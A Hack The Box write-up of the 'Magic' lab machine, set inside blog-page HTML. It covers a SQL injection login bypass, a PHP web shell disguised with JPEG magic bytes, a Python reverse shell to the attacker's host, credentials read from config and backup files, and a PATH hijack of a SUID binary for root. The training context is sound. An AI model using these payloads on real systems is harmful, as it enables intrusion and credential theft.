fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Magic</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Magic</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Aug 23, 2020, 12:38 AM +0800" > Aug 23, 2020 <i class="unloaded">2020-08-23T00:38:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1193 words">6 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.185 magic.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> magic.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-05-28 11:51 EDT
Nmap scan report <span class="k">for </span>magic.htb <span class="o">(</span>10.10.10.185<span class="o">)</span>
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class="o">(</span>RSA<span class="o">)</span>
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Magic Portfolio
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>31.77 seconds

</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>We got no credentials for the <code class="language-plaintext highlighter-rouge">ssh</code> service on port <code class="language-plaintext highlighter-rouge">22</code> so let check out the <code class="language-plaintext highlighter-rouge">http</code> service on port <code class="language-plaintext highlighter-rouge">80</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic1.png" alt="" /></p><p>On the bottom left, there’s a link to a login page.</p><p><code class="language-plaintext highlighter-rouge">http://magic.htb/login.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic2.png" alt="" /></p><p>I threw in some basic <code class="language-plaintext highlighter-rouge">SQL</code> injection by putting <code class="language-plaintext highlighter-rouge">' or 1=1;--</code> in both the username and password and I got in? Nice.</p><p><code class="language-plaintext highlighter-rouge">http://magic.htb/upload.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic3.png" alt="" /></p><p>I submitted nothing and I got this error:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic4.png" alt="" /></p><p>So, the application wants me to support an image. However, based on experience, file upload pages are usually a place where bugs commonly occur so lets see how can we bypass the protections in place.</p><p>First, lets first create our web shell. If we manage to upload this, we basically can run any commands on the box!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>shell.php
&lt;?php
    <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">]))</span>
    <span class="o">{</span>
        system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
    <span class="o">}</span>
?&gt;
</pre></table></code></div></div><p>Lets think about what kind of checks might be in place. Maybe they are checking the file extension?</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mv </span>shell.php shell.php.jpeg
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic5.png" alt="" /></p><p>They probably are but its still not good enough… Well since this box is called “Magic”, perhaps they are checking the magic bytes of the file uploaded? The magic bytes of a file is used to identify what type of file it is so that the system can properly interpret it and process accordingly. We can use the <code class="language-plaintext highlighter-rouge">file</code> command to see what our file is interpreted as.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file shell.php.jpeg
shell.php.jpeg: PHP script, ASCII text
</pre></table></code></div></div><p>Well, our file is definitely not recognized as a <code class="language-plaintext highlighter-rouge">JPEG</code> file. According to this <a href="https://www.filesignatures.net/index.php?page=search&amp;search=JFIF&amp;mode=EXT">link</a>, the magic bytes of a <code class="language-plaintext highlighter-rouge">JPEG</code> file is <code class="language-plaintext highlighter-rouge">FF D8 FF E0</code>. Hence, we can just append these bytes to the front of our file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">FF</span><span class="se">\x</span><span class="s2">D8</span><span class="se">\x</span><span class="s2">FF</span><span class="se">\x</span><span class="s2">E0'"</span><span class="si">)$(</span><span class="nb">cat </span>shell.php.jpeg<span class="si">)</span><span class="s2">"</span> <span class="o">&gt;</span> shell.php.jpeg
<span class="nv">$ </span>file shell.php.jpeg
shell.php.jpeg: JPEG image data
</pre></table></code></div></div><p>Now lets try uploading it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic6.png" alt="" /></p><p>Now lets figure out where does our file end up at. If you go back to the home page and right-click on the images and click on “View Image”, you will see that uploaded images are saved to <code class="language-plaintext highlighter-rouge">http://magic.htb/images/uploads/</code>. So, lets see if our web shell is there! Note that the uploaded files get cleared every now and then so you might need to reupload your web shell again to see it.</p><p><code class="language-plaintext highlighter-rouge">http://magic.htb/images/uploads/shell.php.jpeg</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic7.png" alt="" /></p><p>These weird characters that you see are actually the magic bytes you added to our web shell! If we add the <code class="language-plaintext highlighter-rouge">?cmd=whoami</code> to the end of our URL,</p><p><code class="language-plaintext highlighter-rouge">http://magic.htb/images/uploads/shell.php.jpeg?cmd=whoami</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/magic8.png" alt="" /></p><p>We see that we can now arbitrary commands! The next step is probably to establish a more stable reverse shell since our web shell will get deleted every now and then. Since Python 3 was installed on the box (You can run <code class="language-plaintext highlighter-rouge">which python3</code> to see if it is installed), we can execute a python reverse shell.</p><p>Starting our listener…</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p>And by visiting <code class="language-plaintext highlighter-rouge">http://magic.htb/images/uploads/shell.php.jpeg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>,</p><p>We now have a reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185] 48482
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c "import pty;pty.spawn('</span>/bin/bash<span class="s1">')"
www-data@ubuntu:/var/www/Magic/images/uploads$
</span></pre></table></code></div></div><p>As <code class="language-plaintext highlighter-rouge">www-data</code>, we can check out what files are there in the root directory of the web service. In <code class="language-plaintext highlighter-rouge">/var/www/Magic</code>, there were 2 files of interest.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic/images/uploads<span class="nv">$ </span><span class="nb">cat</span> /var/www/Magic/db.php5
&lt;?php
class Database
<span class="o">{</span>
    private static <span class="nv">$dbName</span> <span class="o">=</span> <span class="s1">'Magic'</span> <span class="p">;</span>
    private static <span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span> <span class="p">;</span>
    private static <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'theseus'</span><span class="p">;</span>
    private static <span class="nv">$dbUserPassword</span> <span class="o">=</span> <span class="s1">'iamkingtheseus'</span><span class="p">;</span>
...
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic/images/uploads<span class="nv">$ </span><span class="nb">cat</span> /var/www/Magic/backup.sql
...
INSERT INTO <span class="sb">`</span>login<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'Th3s3usW4sK1ng'</span><span class="o">)</span><span class="p">;</span>
...
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge"> We got 2 usernames, </code>theseus<code class="language-plaintext highlighter-rouge"> and </code>admin<code class="language-plaintext highlighter-rouge">, and 2 passwords, </code>iamkingtheseus<code class="language-plaintext highlighter-rouge"> and </code>Th3s3usW4sK1ng<code class="language-plaintext highlighter-rouge">. Let see what users we have in </code>/home`.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> /home
theseus
</pre></table></code></div></div><h1 id="usertxt">user.txt</h1><p>I guess we now know what to do. Using the 2 passwords we found, we manage to <code class="language-plaintext highlighter-rouge">su</code> to <code class="language-plaintext highlighter-rouge">theseus</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic/images/uploads<span class="nv">$ </span>su theseus
Th3s3usW4sK1ng
theseus@ubuntu:/var/www/Magic/images/uploads<span class="nv">$ </span><span class="nb">cat</span> /home/theseus/user.txt
a9aaXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>Lets run <a href="https://github.com/rebootuser/LinEnum"><code class="language-plaintext highlighter-rouge">LinEnum.sh</code></a> to see we can find anything to help use escalate our privileges.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>theseus@ubuntu:/var/www/Magic/images/uploads<span class="nv">$ </span>wget http://10.10.XX.XX/LinEnum.sh
<span class="nt">--2020-08-22</span> 04:59:07--  http://10.10.XX.XX/LinEnum.sh
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 <span class="o">(</span>45K<span class="o">)</span> <span class="o">[</span>text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                100%[<span class="o">========================================================&gt;]</span>  45.39K  85.5KB/s    <span class="k">in </span>0.5s    

2020-08-22 04:59:08 <span class="o">(</span>85.5 KB/s<span class="o">)</span> - ‘LinEnum.sh’ saved <span class="o">[</span>46476/46476]

theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x LinEnum.sh
...
<span class="o">[</span>-] SUID files:
...
<span class="nt">-rwsr-x---</span> 1 root <span class="nb">users </span>22040 Oct 21  2019 /bin/sysinfo
...
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">sysinfo</code> is not a binary commonly found in Linux distributions so lets look into it. When executing it, it prints information related to your memory, your disk and your CPU information. But if we look deeper into it,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>theseus@ubuntu:/tmp<span class="nv">$ </span>ltrace /bin/sysinfo 2&gt;&amp;1 | <span class="nb">grep </span>popen
ltrace /bin/sysinfo 2&gt;&amp;1 | <span class="nb">grep </span>popen
popen<span class="o">(</span><span class="s2">"lshw -short"</span>, <span class="s2">"r"</span><span class="o">)</span>                        <span class="o">=</span> 0x5579b300ee80
popen<span class="o">(</span><span class="s2">"fdisk -l"</span>, <span class="s2">"r"</span><span class="o">)</span>                           <span class="o">=</span> 0x5579b300ee80
popen<span class="o">(</span><span class="s2">"cat /proc/cpuinfo"</span>, <span class="s2">"r"</span><span class="o">)</span>                  <span class="o">=</span> 0x5579b300ee80
popen<span class="o">(</span><span class="s2">"free -h"</span>, <span class="s2">"r"</span><span class="o">)</span>                            <span class="o">=</span> 0x5579b300ee80
</pre></table></code></div></div><p>It is actually running other commands to retrieve the above said information! Since the path of the binaries executed is not full, we can manipulate our <code class="language-plaintext highlighter-rouge">$PATH</code> variable so that our own code will be executed instead of the legitimate binary! We got 4 choices but I will choose <code class="language-plaintext highlighter-rouge">free</code>.</p><p>Preparing our payload:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;&gt;</span> /tmp/free
theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x free
</pre></table></code></div></div><p>Manipulating our <code class="language-plaintext highlighter-rouge">$PATH</code> variable so that the OS will check <code class="language-plaintext highlighter-rouge">/tmp</code> for <code class="language-plaintext highlighter-rouge">free</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>theseus@ubuntu:/tmp<span class="nv">$ PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
</pre></table></code></div></div><p>And now finally, if we run <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>theseus@ubuntu:/tmp<span class="nv">$ </span>/bin/sysinfo
<span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
root@ubuntu:/tmp#
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>We are now root! However, the output of commands will not be printed until I exit the current shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>root@ubuntu:/tmp# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
root@ubuntu:/tmp# <span class="nb">exit
exit
exit
</span>4328XXXXXXXXXXXXXXXXXXXXXXXXXXXX
theseus@ubuntu:/tmp<span class="err">$</span>
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/magic/" class="post-tag no-text-decoration" >magic</a> <a href="/tags/path/" class="post-tag no-text-decoration" >path</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Magic - rizemon's blog&url=https://rizemon.github.io/posts/magic-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Magic - rizemon's blog&u=https://rizemon.github.io/posts/magic-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Magic - rizemon's blog&url=https://rizemon.github.io/posts/magic-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/standcon2021-starcereal-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>STANDCON CTF - Star Cereal</h3><div class="text-muted small"><p> Description Have you heard of Star Cereal? It’s a new brand of cereal that’s been rapidly gaining popularity amongst astronauts - so much so that their devs had to scramble to piece together a ...</p></div></div></a></div><div class="card"> <a href="/posts/standcon2021-starcereal2-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>STANDCON CTF - Star Cereal 2</h3><div class="text-muted small"><p> Description Ha, that was sneaky! But I’ve patched the login so that people like you can’t gain access anymore. Stop hacking us! http://20.198.209.142:55045 The flag is in the flag format:...</p></div></div></a></div><div class="card"> <a href="/posts/networked-htb/"><div class="card-body"> <span class="timeago small" > Nov 17, 2019 <i class="unloaded">2019-11-17T11:28:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Networked</h3><div class="text-muted small"><p> I really learnt a lot from this box such as the double extension attack and passing of variables into the environment of a command in bash. The operating system that I will be using to tackle th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/traceback-htb/" class="btn btn-outline-primary"><p>Hack The Box - Traceback</p></a> <a href="/posts/computingday2020-ctf/" class="btn btn-outline-primary"><p>NUS Computing Day 2020 CTF by NUS Greyhats</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag 